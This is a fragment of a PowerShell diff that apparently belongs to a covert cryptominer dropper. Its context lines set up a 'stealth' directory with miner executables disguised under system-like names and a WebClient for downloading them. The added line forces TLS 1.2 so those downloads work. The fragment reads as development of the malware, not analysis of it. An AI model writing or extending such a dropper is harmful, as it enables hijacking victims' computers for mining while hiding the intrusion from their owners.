@@ -18,6 +18,7 @@ $CpuExe = Join-Path $StealthDir "win_sys_x.exe"
 $GpuExe = Join-Path $StealthDir "win_sys_g.exe"
 
 try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
     $wc = New-Object System.Net.WebClient
 
     # 1. Handle CPU Miner
